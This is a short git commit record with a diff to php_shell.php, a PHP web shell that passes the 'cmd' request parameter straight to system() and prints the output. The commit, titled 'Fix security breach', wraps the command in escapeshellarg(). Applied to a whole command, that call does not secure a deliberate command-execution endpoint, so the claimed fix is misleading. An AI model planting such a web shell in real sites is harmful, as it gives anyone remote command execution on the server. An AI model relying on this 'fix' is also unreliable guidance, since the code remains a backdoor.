c034eb964b94ed090616788475022edf6d55aa79
Gonzalo Goral <goral.gonzalo@gmail.com>
2018-02-23 11:46:41 -0300

    Fix security breach
    escapeshellarg() adds single quotes around a string and quotes/escapes any existing single quotes allowing you to pass a string directly to a shell function and having it be treated as a single safe argument.

--- php_shell.php
+++ php_shell.php
@@ -4,6 +4,7 @@
 if(isset($_REQUEST['cmd'])){
         echo "<pre>";
         $cmd = ($_REQUEST['cmd']);
+        $cmd = escapeshellarg($cmd);
         system($cmd);
         echo "</pre>";
         die;
